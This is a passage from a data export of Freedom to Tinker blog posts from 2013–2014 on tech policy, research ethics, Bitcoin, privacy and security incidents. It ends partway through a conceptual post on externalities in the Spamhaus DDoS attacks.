scheme is probably the way to go. Otherwise the Langford scheme is a good option as long as a secure setup/dealing process can be established. For two-factor security, Mackenzie & Reiter seems close to ideal; the Langford scheme is also reasonable, but requires that wallet generation be done on a device that can be guaranteed to be secure."
"238","2014-06-30","2023-03-24","https://freedom-to-tinker.com/2014/06/30/facebooks-emotional-manipulation-study-when-ethical-worlds-collide/","The research community is buzzing about the ethics of Facebook’s now-famous experiment in which it manipulated the emotional content of users’ news feeds to see how that would affect users’ activity on the site. (The paper, by Adam Kramer of Facebook, Jamie Guillory of UCSF, and Jeffrey Hancock of Cornell, appeared in Proceedings of the National Academy of Sciences.) The main dispute seems to be between people such as James Grimmelmann and Zeynep Tufecki who see this as a clear violation of research ethics; versus people such as Tal Yarkoni who see it as consistent with ordinary practices for a big online company like Facebook. One explanation for the controversy is the large gap between the ethical standards of industry practice, versus the research community’s ethical standards for human subjects studies. Industry practice allows pretty much any use of data within a company, and infers consent from a brief mention of “research” in a huge terms of use document whose existence is known to the user. (UPDATE (8:30pm EDT, June 30 2014): Kashmir Hill noticed that Facebook’s terms of use did not say anything about “research” at the time the study was done, although they do today.) Users voluntarily give their data to Facebook and Facebook is free to design and operate its service any way it likes, unless it violates its privacy policy or terms of use. The research community’s ethics rules are much more stringent, and got that way because of terrible abuses in the past. They put the human subject at the center of the ethical equation, requiring specific, fully informed consent from the subject, and giving the subject the right to opt out of the study at any point without consequence. If there is any risk of harm to the subject, it is the subject and not the researchers who gets to decide whether the risks are justified by the potential benefits to human knowledge. If there is a close call as to whether a risk is real or worth worrying about, that call is for the subject to make. Facebook’s actions were justified according to the industry ethical standards, but they were clearly inconsistent with the research community’s ethical standards. For example, there was no specific consent for participation in the study, no specific opt-out, and subjects were not informed of the potential harms they might suffer. The study set out to see if certain actions would make subjects unhappy, thereby creating a risk of making subjects unhappy, which is a risk of harm—a risk that is real enough to justify informing subjects about it. The lead author of the study, Adam Kramer, who works for Facebook, wrote a statement (on Facebook, naturally, but quoted in Kashmir Hill’s article) explaining his justification of the study. […] The reason we did this research is because we care about the emotional impact of Facebook and the people that use our product. We felt that it was important to investigate the common worry that seeing friends post positive content leads to people feeling negative or left out. At the same time, we were concerned that exposure to friends’ negativity might lead people to avoid visiting Facebook. We didn’t clearly state our motivations in the paper. […] The goal of all of our research at Facebook is to learn how to provide a better service. Having written and designed this experiment myself, I can tell you that our goal was never to upset anyone. I can understand why some people have concerns about it, and my coauthors and I are very sorry for the way the paper described the research and any anxiety it caused. In hindsight, the research benefits of the paper may not have justified all of this anxiety. This misses the point of the objections. He justifies the research by saying that the authors’ intention was to help users and improve Facebook products, and he expresses regret for not explaining that clearly enough in the paper. But the core of the objection to the research is that the researchers should not have been the ones deciding whether those benefits justified exposing subjects to the experiment’s possible side-effects. The gap between industry and research ethics frameworks won’t disappear, and it will continue to cause trouble. There are at least two problems it might cause. First, it could drive a wedge between company researchers and the outside research community, where company researchers have trouble finding collaborators or publishing their work because they fail to meet research-community ethics standards. Second, it could lead to “IRB laundering”, where academic researchers evade formal ethics-review processes by collaborating with corporate researchers who do experiments and collect data within a company where ethics review processes are looser. Will this lead to a useful conversation about how to draw ethical lines that make sense across the full spectrum from research to practice? Maybe. It might also breathe some life into the discussion about the implications of this kind of manipulation outside of the research setting. Both are conversations worth having. UPDATE (3pm EDT, June 30, 2014): Cornell issued a carefully worded statement (compare to earlier press release) that makes this look like a case of “IRB laundering”: Cornell researchers had “initial discussions” with Facebook, Facebook manipulated feeds and gathered the data, then Cornell helped analyze the data. No need for Cornell to worry about the ethics of the manipulation/collection phase, because “the research was done independently by Facebook”."
"239","2014-07-31","2023-03-24","https://freedom-to-tinker.com/2014/07/31/why-were-cert-researchers-attacking-tor/","Yesterday the Tor Project issued an advisory describing a large-scale identification attack on Tor hidden services. The attack started on January 30 and ended when Tor ejected the attackers on July 4. It appears that this attack was the subject of a Black Hat talk that was canceled abruptly. These attacks raise serious questions about research ethics and institutional responsibilities. Let’s review the timeline as we know it (all dates in 2014): 30 January: 115 new machines join the Tor network as relays, carrying out an ongoing, novel identification attack against Tor hidden services. 18 February – 4 April: Researchers at CERT (part of the Software Engineering Institute at Carnegie Mellon University) submit a presentation proposal to Black Hat, proposing to discuss a new identification attack on Tor. sometime March – May: Tor Project learns of the research and seeks information from the researchers, who decline to give details. early June: Black Hat accepts the presentation and posts an abstract of the research, referencing the vulnerability and saying the researchers had carried out the attack in the wild. late June: The researchers give the Tor Project a few hints about the attack but do not reveal details. 4 July: Tor Project discovers the ongoing attack, ejects the attacking relays from the Tor network, and starts developing a software fix to prevent the attack. The discovery was aided by some hints that the Tor team was able to extract from the researchers. 21 July: Black Hat announces cancellation of the scheduled presentation, saying that “the materials that he would be speaking about have not yet approved by CMU/SEI for public release.” 30 July: Tor Project releases a software update to fix the vulnerability, along with a detailed technical discussion of the attack. Tor Project is still unsure as to whether the attacks they saw were carried out by the CERT researchers, though this seems likely given the similarities between the attacks and the researchers’ presentation abstract. This story raises some serious questions of research ethics. I’m hard pressed to think of previous examples where legitimate researchers carried out a large scale attack lasting for months that aimed to undermine the security of real users. That in itself is ethically problematic at least. The waters get even darker when we consider the data that the researchers might have gathered—data that would undermine the security of Tor users. Did the researchers gather and keep this data? With whom have they shared it? If they still have it, what are they doing to protect it? CERT, SEI, and CMU are not talking. The role of CERT in this story deserves special attention. CERT was set up in the aftermath of the Morris Worm as a clearinghouse for vulnerability information. The purpose of CERT was to (1) prevent attacks by (2) channeling vulnerability information to vendors and eventually (3) informing the public. Yet here, CERT staff (1) carried out a large-scale, long-lasting attack while (2) withholding vulnerability information from the vendor, and now, even after the vulnerability has been fixed, (3) withholding the same information from the public. So CERT has some explaining to do. While they’re at it, they ought to explain what their researchers did, what data was collected and when, and who has the data now. It’s too late to cover up what happened; now it’s time for CERT to give us some answers. [Post updated, 31 July 2014 at 6:45pm EDT, to correct two details in the timeline (number of servers and date of first hints from the researchers). Thanks to the Tor Project for pointing these out.]"
"240","2014-08-26","2023-03-24","https://freedom-to-tinker.com/2014/08/26/takedown-2-0-the-trouble-with-broad-tros-targeting-non-party-online-intermediaries/","On August 14, a federal district court in Oregon issued an ex parte temporary restraining order (TRO) in a civil copyright infringement case, ABS-CBN v. Ashby. The defendants in the case are accused of operating several “pirate websites” that infringe the plaintiffs’ copyrights in broadcast television programs. In addition to ordering the defendants to stop engaging in infringing conduct, the court ordered unspecified “Internet search engines, Web hosts, domain-name registrars, and domain name registries or their administrators [to] cease facilitating access to any or all domain names and websites through which Defendants engage in the [infringement] of Plaintiffs’ copyrighted works.” The court ordered the domain name registrars that had originally registered the defendants’ domain names to transfer the registrations for the pendency of the litigation to a new registrar chosen by the plaintiffs. It then ordered the new, as-yet-unidentified registrar to divert traffic from the defendants’ sites to a location displaying legal documents from the case. None of the online intermediaries targeted by the order is a named party in the case, and none was represented in court before the TRO issued. A little over a week before the Oregon court issued its TRO, a federal district court in California issued a TRO in another “pirate website” case involving sites streaming and distributing pre-release copies of “The Expendables 3.” The California court’s order to stop providing services to the defendants was directed broadly to “persons and entities providing any services to or in connection with the domain names <limetorrents.com>, <billionuploads.com>, <hulkfile.eu>, <played.to>, <swankshare.com> and/or <dotsemper.com> or the websites to which any of those domain names resolve.” In addition to domain name registrars and hosting services, the California court’s order swept in “[a]ll banks, savings and loan associations, payment processors or other financial institutions, payment providers, third party processors and advertising service providers of Defendants.” Again, none of the online intermediaries targeted in the order is a named party in the case and none was represented in court before the TRO issued. The reach of these orders is breathtaking, particularly in light of the non-party status of the targeted intermediaries. Generally speaking, a court has no authority to issue an order to a non-party over which or whom it has not acquired personal jurisdiction. This default rule is protective of due process and prevents non-parties from having their rights adjudicated to their prejudice when they’re not present to be heard. Under Rule 65 of the Federal Rules of Civil Procedure, a “[court] order binds only the following who receive actual notice of it by personal service or otherwise: (A) the parties; (B) the parties’ officers, agents, servants, employees, and attorneys; and (C) other persons who are in active concert or participation with anyone described in…(A) or (B).” There is, simply stated, a requirement of privity or close relationship between the actual parties to the case and any non-parties over which or whom the court seeks to extend its injunctive power. The requisite Rule 65 relationship is far from self-evidently present in either of the cases cited above with respect to any of the targeted intermediaries. The Oregon court did not even characterize the targeted third-party intermediaries as being “in active concert or participation” with the defendants. It simply ordered them to act upon notice of the injunction. The California court expressly characterized the domain name and hosting intermediaries as being included among the persons or entities “in active concert or participation with [the defendants].” It did not, however, so characterize the range of third-party intermediaries providing payment-related services for the defendants’ websites. Just as the Oregon court did with all of the intermediaries affected by its order, the California court simply ordered the payment intermediaries to act upon receiving notice of the injunction. Under federal case law, a non-party is said to be “in active concert or participation” if that non-party is “legally identified with [the] defendant, or, at least, deemed to have aided and abetted [the] defendant in the enjoined conduct.” That means “acting in collusion with, or as the alter ego of, an enjoined party.” It strikes me as a real stretch to argue that the search engines, web hosts, domain name registrars, and payment processors targeted in these cases have the kind of close relationship with the defendants that is necessary to justify extending an injunction against the defendants to them. Judges in these cases should really be taking a more searching and disciplined approach to the Rule 65 standard. Due process is not well served when courts issue sweeping ex parte orders that purport to bind unknown (and potentially large) numbers of strangers to the litigation over which they’re presiding."
"241","2014-09-15","2023-03-24","https://freedom-to-tinker.com/2014/09/15/its-time-to-bring-bitcoin-and-cryptocurrencies-into-the-computer-science-curriculum/","In the privacy technologies grad seminar that I taught last semester, Bitcoin proved to be the most popular topic among students. Two groups did very different and equally interesting final projects on Bitcoin and cryptocurrencies; more on that below. More broadly, we’re seeing a huge demand for learning the computer science underlying Bitcoin, both at Princeton and elsewhere. But research papers on Bitcoin don’t make for great teaching materials. Identifying the core ideas, building them up in logical progression, and connecting them to other areas of computer science is a challenging task. Over the summer, I teamed up with Joe Bonneau, Ed Felten, and Andrew Miller to do just that. We’ve produced a lecture series which will start going online soon. While we spend some time in the lectures on the specifics of Bitcoin, much of our discussion is about the underlying principles which apply to cryptocurrencies in general. Steven Goldfeder and other students are working with us to produce homeworks, programming assignments, and a textbook, which will together comprise a complete online course. We’ll announce it here when it launches. I’m teaching a version of the course at Princeton as a grad seminar this semester. To my knowledge, this is the first time a course on Bitcoin and cryptocurrency technologies has been taught. I’m looking forward to seeing the final projects that students will do. I would encourage all CS departments to offer a course on Bitcoin. It’s a topic that students already have a high level of interest in, and it ties together ideas from many areas of computer science — algorithms, cryptography and security, distributed systems, game theory, and programming languages. It also lets you make a few forays into economics, law, and policy. Even if Bitcoin as a currency goes away, these ideas stand on their own and are here to stay. Here are the two Bitcoin projects from my previous course that I mentioned earlier: Aaron Doll, Shaheed Chagani, Michael Kranch, and Vaidhyanath Murti built a tool called btctrackr (code, report) that finds clusters in Bitcoin addresses. They build on techniques in the Fistful of Bitcoins paper. The tool lets the user test which of her addresses can be linked to each other, and thus, how much anonymity she has. Andrew Kim, Daryl Sng, and Soyeon Yu wrote a paper examining the feasibility of a state attack on Bitcoin. Much of their work focuses on analyzing the cost of a 51% attack. They write: Our calculations suggest that amassing sufficient computing power to launch a 51% attack with the existing technology would cost between US$128 million and US$145 million. Energy costs could be as low as US$106,000 to US$136,000 each day if the mining occurred in a low-cost electricity state in the US or China. Another important factor is the likely growth rate in the Bitcoin hash rate relative to the cost of equipment. Drawing from Professor Michael B. Taylor’s work and estimates, our calculations found that a computing-power based attack could cost US$3 billion in ten years. While all of these costs are not trivial, they are figures that remain within reach of governments like China and the US. If a state decided to amass the computing power to launch a 51% attack, its main hurdle would likely be the supply of mining hardware, which is finite and might not be sufficient to double the computing power. Additionally, existing ASIC manufacturers could block the large-scale purchase of mining hardware if such an order were detected and raised suspicions. That said, states could take measures to divide their purchase among multiple false online actors. Alternatively, it could produce its own ASICs through state-owned enterprises or expropriate current ASIC production capacity within its borders. Although a sudden influx of new computing power could provoke suspicion and cause demand to change the rules, introducing new rules requires building consensus. This could take more time than it requires for a state to secretly hoard the computing power. A state may only need to accumulate the computer power necessary by stealth and only execute the attack successfully once to reduce faith in Bitcoin’s reliability. Our calculations help to demonstrate that Bitcoin’s security and viability are not purely derived from its decentralized architecture and technical robustness. With that, the Bitcoin community has not paid enough attention to the potential for a state to sponsor a destabilizing attack on Bitcoin. The proponents of Bitcoin must be aware of the fact that the state, from which it requires recognition and perhaps even protection, can itself threaten the currency as an attacker. The reality of Bitcoin’s vulnerability to state attacks should be included in this debate."
"242","2014-10-27","2023-03-24","https://freedom-to-tinker.com/2014/10/27/bitcoin-mining-is-np-hard/","This post is (mostly) a theoretical curiosity, but a discussion last week at CITP during our new course on Bitcoin led us to realize that being an optimal Bitcoin miner is in fact NP-hard. NP-hardness is a complexity classification used in computer science to describe many optimization problems for which we believe there is no algorithm which can always solve such problems efficiently. We’re not talking about the well-known hash puzzle portion of Bitcoin mining here in which miners race to find a block with an unusually low hash value-that’s hard by design. Before hashing anything miners first have to assemble a candidate block by choosing which transactions to include from the set of all pending transactions. As it turns out, this requires solving two optimization problems, both of which are NP-hard! At any time, there is a set of outstanding transactions which have been relayed to the Bitcoin network but not yet included in any blocks. Miners are free to include any of these transactions they like, subject to the constraint that all included transactions are well-formed, only reference other transactions which have been published (possibly in the same block), and don’t conflict (double-spend) with any other published transaction. They also must ensure the total block size is less than 1MB. Each transaction also has an attached fee. Miners’ goal in assembling a block is to choose a block of transactions with the greatest aggregate transaction fees. This leads to two optimization problems: Problem 1: Transaction sizes and fees (the knapsack problem) Transactions have different sizes (depending on the number of previous transactions they redeem and also the complexity of their input and output scripts). Transactions can also have arbitrary transaction fees, chosen by the users relaying those transactions. Miners need to solve the problem of selecting the set of transactions with the greatest total transaction fee but still below the 1MB block limit. This is exactly equivalent to the classic knapsack problem in which you want to fill a knapsack of limited weight capacity with the most valuable subset of items from some set of possible items with varying weight and value. Building a Bitcoin block is just a knapsack problem with “weight” being the size of each transaction, “value” being the transaction fee, and the total “capacity” as the 1 MB block limit. The knapsack problem is well-studied. Finding the optimal solution is NP-hard and deciding if a solution exists above some fixed value threshold is NP-complete. These conclusions also apply to assembling a Bitcoin block as long as there are varying transaction sizes and fees, even without the extra complexity from the fact that some transactions conflict with others. Problem 2: Transaction conflicts (the maximum independent-set problem) Transactions also have dependencies and conflicts. We’ll take conflicts first, which come from the prohibition on double-spending. We’ll also make the problem considerably easier by ignoring the block size limit and assuming all transactions have a constant fee. If transactions B and B’ both claim funds from transaction A, then only one of B and B’ can be published and we say they conflict. If this is the only constraint, we can simply draw a graph of all transactions with edges between transactions which conflict. The miner’s task is to find the largest set of vertices (transactions) with no edge between then (no conflict). Solving this is exactly the maximum independent set problem. Once again, this means finding the optimal solution is NP-hard and deciding if a solution exists above a certain size (which would indicate the total transaction fee since we assumed fixed transaction fees) is NP-complete. There are also dependencies, but we can roll these in to the conflicts graph which means they don’t make the problem any harder from a complexity perspective. Dependencies come from the fact that if transaction B redeems funds from transaction A, transaction A must be published if transaction B is. It is legal in Bitcoin for A and B to appear in the same block. It appears this requires adding a new type of (directed) edge to our graph with transaction conflicts. However, since we’re ignoring the total block size limit, we can remove the dependency edges and say that if we want to publish B which depends on A, we’ll just publish A as well. We’re also using the fact that transaction fees are strictly non-negative. We’ll need to add extra conflict edges though: If B depends on A, and A conflicts with A’, then B also conflicts with A’. So for each transaction, we need to add as conflicts the set of all conflicting transactions of all of its dependencies. This is a polynomial-time transformation and with the modified graph we can still find the largest conflict-free and dependency-satisfying set of transactions by solving the maximum independent set problem. In this case we’ve ignored varying transaction sizes and fees completely, and the problem is NP-hard simply because of conflicts. Not so much a problem in practice? In practice, assembling optimum Bitcoin blocks requires solving both problems simultaneously. The two-headed beast is clearly NP-hard, since both sub-problems are. The decision version of the problem (is there a block above a certain transaction fee threshold) is also NP-complete, since it’s also NP-hard and it’s in NP because there’s clearly a polynomial time algorithm to verify correct solutions. Does any of this matter in practice? Many problems are NP-hard in theory, but practical instance are typically easy to solve or approximate. It’s not clear if typical instances of “the Bitcoin block problem” are hard. Double-spends a relatively rare, as is publishing a transaction in the same block as its parent transaction, so the maximum independent set problem is probably easy in practice today. The knapsack problem may be non-trivial in practice. Typical Bitcoin blocks are assembled from a pool thousands or tens of thousands of possible transactions, of which the size and fees do vary considerably (here’s an example block). The current default Bitcoin implementation makes no effort to solve or even really approximately this problem: transactions are simply sorted using a heuristic “priority” formula and then greedily added. It’s possible miners could profit slightly more by improving on this, but this formula has other benefits as it enforces minimum transaction fee amounts and it makes the process transparent for end users. Because almost all mining rewards still come from minting new coins rather than collecting fees, there’s not a great incentive to do better. This might change in the future with the planned transition towards mining fees in place of fixed block rewards. If it does, perhaps miners will want to learn a little bit about complexity theory and optimization problems. There’s also the chance that if miners do start trying harder to solve the problem, they will be subject to denial-of-service by algorithmic complexity attacks, in which attackers deliberately broadcast blocks so as to make the problem very computationally challenging to solve. In any case, this is yet another cool example of how Bitcoin manages to touch seemingly all areas of computer science. As we’ve said before, this makes Bitcoin a fantastic topic for any computer science curriculum to cover! Thanks to Jeremy Clark for comments on a draft of this post."
"243","2014-11-24","2023-03-24","https://freedom-to-tinker.com/2014/11/24/how-do-we-decide-how-much-to-reveal-hint-our-privacy-behavior-might-be-socially-constructed/","[Let’s welcome Aylin Caliskan-Islam, a graduate student at Drexel. In this post she discusses new work that applies machine learning and natural-language processing to questions of privacy and social behavior. — Arvind Narayanan.] How do we decide how much to share online given that information can spread to millions in large social networks? Is it always our own decision or are we influenced by our friends? Let’s isolate this problem to one variable, private information. How much private information are we sharing in our posts and are we the only authority controlling how much private information to divulge in our textual messages? Understanding how privacy behavior is formed could give us key insights for choosing our privacy settings, friends circles, and how much privacy to sacrifice in social networks. Christakis and Fowler’s network analytics study showed that obesity spreads through social ties. In another study, they explain that smoking cessation is a collective behavior. Our intuition before analyzing end users’ privacy behavior was that privacy behavior might also be under the effect of network phenomena. In a recent paper that appeared at the 2014 Workshop on Privacy in the Electronic Society, we present a novel method for quantifying privacy behavior of users by using machine learning classifiers and natural-language processing techniques including topic categorization, named entity recognition, and semantic classification. Following the intuition that some textual data is more private than others, we had Amazon Mechanical Turk workers label tweets of hundreds of users as private or not based on nine privacy categories that were influenced by Wang et al.’s Facebook regrets categories and Sleeper et al.’s Twitter regrets categories. These labels were used to associate a privacy score with each user to reflect the amount of private information they reveal. We trained a machine learning classifier based on the calculated privacy scores to predict the privacy scores of 2,000 Twitter users whose data were collected through the Twitter API. Additionally, we found that there is a correlation between the privacy score of a user and those of her friends. There is even a higher correlation of privacy score between a user and the other users mentioned in her tweets. People with similar privacy scores appear in groups. The possible causal relationships in this phenomenon need further exploration. The ability to automatically quantify private information disclosure and compute privacy scores provides a potentially useful method for users, researchers, and companies. A user can make sharing decisions in a more informed manner if the privacy risk associated with each friend is known. For example, she can take privacy scores into account when constructing friend lists. Researchers who study people’s use of social media can also use the privacy score calculation method for a fine grained analysis of individual privacy behavior. Which type of textual data, namely messages, status updates, mentions, or comments have more private information? Social media companies could tailor “nudges” based on users’ (and their friends’) privacy scores. For example, a social network could alert the user when she is about to share content that appears to be highly private with a group of friends that includes users with low privacy scores. A recent study by Wang et al. on privacy nudges show promising results on preventing unintended disclosure and associated regret. Finally, ethical issues aside, social media companies are also in a position to run controlled experiments to determine if privacy behaviors are indeed contagious. We are planning to do another privacy analytics study after obtaining IRB approval to learn more about how people are influenced to reveal private information and the effects of Facebook’s default newsfeed algorithm. The correlation between the privacy score of a user and her friends gives a starting point for investigating the causal factors behind self-disclosure. Better understanding these factors can help effectively design privacy enhancing technologies and target educational interventions."
"244","2014-12-23","2023-03-24","https://freedom-to-tinker.com/2014/12/23/on-the-sony-pictures-security-breach/","The recent security breach at Sony Pictures is one of the most embarrassing breaches ever, though not the most technically sophisticated. The incident raises lots of interesting questions about the current state of security and public policy. There is an active discussion in the tech community about who is responsible for the attack. The FBI blames the North Korean government, but the evidence cited by the FBI seems thin, and many in the tech community suspect that confirmation bias led the FBI to a conclusion that seems convenient for many in the cyber-industrial complex, not to mention Sony itself. (It’s less embarrassing to get breached by a state-sponsored adversary, as opposed to a gang of punks.) Perhaps there is secret intelligence information confirming North Korean involvement, but nobody has even hinted that this is the case. The DC echo chamber may have decided the North Koreans are responsible, but the tech echo chamber isn’t so sure. A related question is whether the information security breaches at Sony are related to the threats of terrorism against theaters that led Sony to withdraw the film The Interview. Press coverage often assumes that the two come from the same source, but here again the evidence of a link is thin. Careful observers point out that the network attackers’ initial demands didn’t mention the film, focusing instead on Sony’s treatment of its employees—which would point to a disgruntled employee (or ex-employee) rather than the North Koreans. Similarly, the attackers have shown a level of media and online savvy that one doesn’t associate with the North Korean propaganda organs. After the attacks, there may have been multiple parties claiming to speak for the network intruders, and we can’t be sure who is connected to whom and how. It seems clear that Sony had weak security defenses. Reports say Sony Pictures had trouble attracting and recruiting security talent, which isn’t too surprising for a company known for its disdainful attitude toward technology. Being on the wrong side of issues like SOPA/PIPA couldn’t have helped—what technologist would want to work for a company that is trying to break the Internet? In the case of SOPA/PIPA, the company and its trade association, the MPAA, explicitly backed a proposal that would have undermined the feasibility of DNSSEC, a security technology backed by many experts and by the U.S. government. Sony Pictures gave off an anti-technology and anti-security vibe, and it’s likely that the same attitude operated internally. The biggest open question is how this will affect national policy. Thus far national policy has taken an eye-in-the-sky approach that protects a perimeter encompassing government and some big companies, and focuses on surveillance, monitoring, and response rather than broad deployment of protective technologies. Whether the Sony breach is a failure of government policy is debatable—it’s not clear if Sony Pictures is inside the perimeter, and anyway current policy doesn’t emphasize deploying the types of measures that might have protected Sony or reduced the damage—but it will be seen as a failure regardless. The likely response will be to double down on the current strategy. Best-case, 2015 will be the year we finally get serious about addressing information security and privacy vulnerabilities. More likely, we’ll just do a bit more of what we were already doing—and the breaches will continue."
"245","2013-12-30","2023-03-24","https://freedom-to-tinker.com/2013/12/30/top-tech-policy-stories-of-2013/","As the year draws to a close, it’s time to review the top tech policy stories of 2013. (1) NSA Surveillance. The most important story by far was the revelations about the scope and scale of surveillance by the U.S. National Security Agency and allied services. It took a major leak of documents by Edward Snowden to enable this conversation. Those of us in the independent security community were not suprised that the NSA had these capabilities in the abstract, but we were surprised at the scale and aggressiveness with which the agency has been eavesdropping on people all around the world, and even on Americans on U.S. soil. Snowden’s documents allowed us to push past the superficial denials, quasi-denials, and occasional lies that had shielded the agency’s practices for years. The implications of this story will take years to unfold. (2) Aaron Swartz. Aaron’s death at the beginning of the year was a kick in the gut to many of us. We lost a thoughtful and talented activist who saw the best that technology could enable, due to an overzealous prosecutor wielding overly harsh laws, enabled by Aaron’s own bad judgement. If any good came from this tragedy, it was in the soul-searching at MIT and elsewhere about how to reconcile technical creativity with the desires of an increasingly powerful state. (3) Bitcoin. The cryptocurrency hit the mainstream this year, with governments, investors, and academics all trying to understand its dynamics and implications. This story too will take years to unfold. Whether or not Bitcoin survives in the long run, it has opened the door to a new era of technically enabled currencies. (4) Drones and robots. From drones to self-driving cars, this is an issue that began to hit the mainstream in 2013. Expect it to move higher on the list in upcoming years. (5) 3-D printing. A bit farther from the mainstream policy discussion, but also likely to rise on the list as the technology continues to mature. (6) Commercial privacy. Although it was pushed down the list by the attention lavished on government intrusions on privacy, the issues around commercial data collection continued a slow boil this year. (7) Fairness and algorithms. Concern increased about the effect of complex data-driven algorithms on people, especially around fairness issues such as the thin line between personalization and redlining, and questions of digital due process. (8) Cell phone unlocking. Consumers insisted on the ability to unlock their phones, and the policy community listened. The big question going forward is whether this is the beginning of a trend away from regulating consumers’ use of the technologies they have purchased. (9) The TPP process and trade negotiations generally. Pressure mounted on the U.S. government to provide some transparency into the Trans Pacific Partnership negotiations, and more generally to be more open about trade negotiations and to refrain from using trade agreements as a backdoor path to creating new restrictive intellectual property laws."
"246","2013-01-30","2023-03-24","https://freedom-to-tinker.com/2013/01/30/oral-arguments-in-nj-voting-machines-lawsuit-appeal/","The appellate hearing (oral argument) of the New Jersey voting-machines lawsuit (Gusciora v. Christie) has been rescheduled to March 5, 2013 in Trenton, NJ. To learn what this is all about, and why you should attend, click here. To recheck the location, time of day, and date of the hearing before you go down to Trenton, check this very post for updates. Note new time! Time: 10:00 a.m. 11:30 a.m., March 5, 2013 (but arrive significantly earlier, because it takes some time to get through security). Place: 8th Floor, N. Wing, Hughes Justice Complex, Trenton, NJ. Specifically, Part E: Judges Messano, Ostrer and Lihotz. Transportation: If anyone from the Princeton area is interested in carpooling, send me mail."
"247","2013-02-27","2023-03-24","https://freedom-to-tinker.com/2013/02/27/first-principles-for-fostering-civic-engagement-via-digital-technologies-1-know-your-community/","Over the first few months of my Fellowship at CITP, I have had the pleasure of meeting with a number of people from academia, non-profits, for-profit companies and government to discuss the role of digital technologies in fostering civic engagement. In a series of blog posts, I plan to set out ten principles that local governments and communities should look to as they evaluate whether their community is using digital technology effectively to promote civic engagement and solve local problems. Because I do not think that my work developing these principles is complete, I hope to use this forum as a way to offer ideas for further exploration. Feedback is welcome! Principle #1: Know Your Community Before a government can communicate with its constituents effectively or develop innovative ways to solve problems, it must know how the people living in the community are using communications technology. Regarding many other local government functions, governments have a very good sense of citizens’ patterns of behavior. Tools exist to measure car traffic, subway and bus ridership, school enrollment, voting rates, etc. But no one is voluntarily telling the government how they’re communicating with other people – i.e., by e-mail, landline phone, texting, Twitter, or Facebook. Unlike Wal-Mart, Amazon.com or iTunes, with whom people share their personal information in hopes of receiving product recommendations or discounts tailored toward products they might like, governments must make far less educated guesses as to the best ways to reach residents with new information and be mindful to guess in a manner that residents will not find intrusive. To better understand their constituents’ digital communities, local governments must begin by asking a series of questions about Internet and wireless device adoption generally. What percentage of residents are using the Internet? What is the condition of wireline and wireless infrastructure in the community? Is Fiber available or are people still relying on DSL? Are more people accessing services using landline Internet connections or mobile connections? What are the percentages of people using smartphones to access the Internet? Do the answers to these questions vary substantially by neighborhood? Is technology training a big issue in portions of the community? Are there specific challenges because people in the community speak several different languages? The answers to these questions should lead governments to solutions for providing information more effectively to the whole community. These answers can lead governments to determine the proper combination of landline phone, paper and digital communications for reaching residents. These answers can lead to the creation of e-mail groups or development of mobile apps and Twitter feeds to reach people, for example, in response to a finding of high smartphone penetration. Because many local governments will not have the resources to research their communities digital thoroughfares, local governments must rely on other community members such as businesses, universities and non-profits to share their data or help produce new studies – a topic I will address in more detail in a later post. Broadband adoption, however, is only one aspect of building a community that uses technology smartly to solve problems. The next key is identifying specific problems that the government can solve through technology. The City of Boston is leading the way in this regard through its office of New Urban Mechanics, which is “the City’s innovation incubator, building partnerships between City agencies and outside institutions and entrepreneurs to pilot projects in Boston that address resident and business needs.” Two of New Urban Mechanics’ signature projects would improve quality of life in almost any city: The “Boston One Card” provides students with one card that works as a transit pass, school ID, community center ID and library card and the “Street Bump” mobile app collects real-time information about Boston’s roads, allowing the city to identify and repair potholes more efficiently. Regardless of the specific projects, this type of tailored problem solving through technology needs to be exported to communities throughout the country. I have a particular interest in exploring these concepts in my current hometown of Washington, DC. Finally, I recognize that much of the civic innovation I’ve focused on today is centered in cities. While I believe many of the concepts are applicable nationwide, I do plan to spend some more time researching and thinking about challenges and solutions specific to rural communities. Stay tuned."
"248","2013-03-29","2023-03-24","https://freedom-to-tinker.com/2013/03/29/security-lessons-from-the-big-ddos-attacks/","Last week saw news of new Distributed Denial of Service (DDoS) attacks. These may be the largest DDoS attacks ever, peaking at about 300 Gbps (that is, 300 billion bits per second) of traffic aimed at the target but, notwithstanding some of the breathless news coverage, these attacks are not vastly larger than anything before. The attacks are news, but not big news. The attacks were aimed at Spamhaus, which publishes lists of purported spammers. Unsurprisingly, the attackers appear to be associated with spamming—specifically, with Cyberbunker, which is accused of hosting spammers. One interesting aspect of the attacks is the way they exploited externalities. “Externality” is an economics term. For our purposes, it describes a situation where a party could efficiently prevent harm to others—that is, a dollar’s worth of harm could be prevented by spending less than a dollar on prevention—but the harm is not prevented because the party has little or no incentive to prevent harm to strangers. Externalities are a common problem in security—they’re one of the reasons the market has trouble providing adequate security. The recent DDoS attacks exploited three separate externalities. The attackers’ goal was to flood Spamhaus or its network providers with Internet traffic, to overwhelm their capacity to handle incoming network packets. The main technical problem faced by a DoS attacker is how to amplify the attacker’s traffic-sending capacity, so that the amount of traffic arriving at the target is much greater than the attacker can send himself. To do this, the attacker typically tries to induce many computers around the Internet to send large amounts of traffic to the target. The first stage of the attack involved the use of a botnet, consisting of a large number of software agents surreptitiously installed on the computers of ordinary users. These bots were commanded to send attack traffic. Notice how this amplifies the attacker’s traffic-sending capability: by sending a few commands to the botnet, the attacker can induce the botnet to send large amounts of attack traffic. This step exploits our first externality: the owners of the bot-infected computers might have done more to prevent the infection, but the harm from this kind of attack activity falls onto strangers, so the computer owners had a reduced incentive to prevent it. Rather than having the bots send traffic directly to Spamhaus, the attackers used another step to further amplify the volume of traffic. They had the bots send queries to DNS proxies across the Internet (which answer questions about how machine names like www.freedom-to-tinker.com related to IP addresses like 209.20.73.44). This amplifies traffic because the bots can send a small query that elicits a large response message from the proxy. Here is our second externality: the existence of open DNS proxies that will respond to requests from anywhere on the Internet. Many organizations run DNS proxies for use by their own people. A well-managed DNS proxy is supposed to check that requests are coming from within the same organization; but many proxies fail to check this—they’re “open” and will respond to requests from anywhere. This can lead to trouble, but the resulting harm falls mostly on people outside the organization (e.g. Spamhaus) so there isn’t much incentive to take even simple steps to prevent it. To complete the attack, the DNS requests were sent with false return addresses, saying that the queries had come from Spamhaus—which causes the DNS proxies to direct their large response messages to Spamhaus. Here is our third externality: the failure to detect packets with forged return addresses. When a packet with a false return address is injected, it’s fairly easy for the originating network to detect this: if a packet comes from inside your organization, but it has a return address that is outside your organization, then the return address must be forged and the packet should be discarded. But many networks fail to check this. This causes harm but—you guessed it—the harm falls outside the organization, so there isn’t much incentive to check. And indeed, this kind of packet filtering has long been considered a best practice but many networks still fail to do it. To review, the attackers used three tricks to amplify their traffic: exploiting bots, bouncing traffic off of open DNS proxies, and forging return addresses. Each trick exploited an externality. The role of 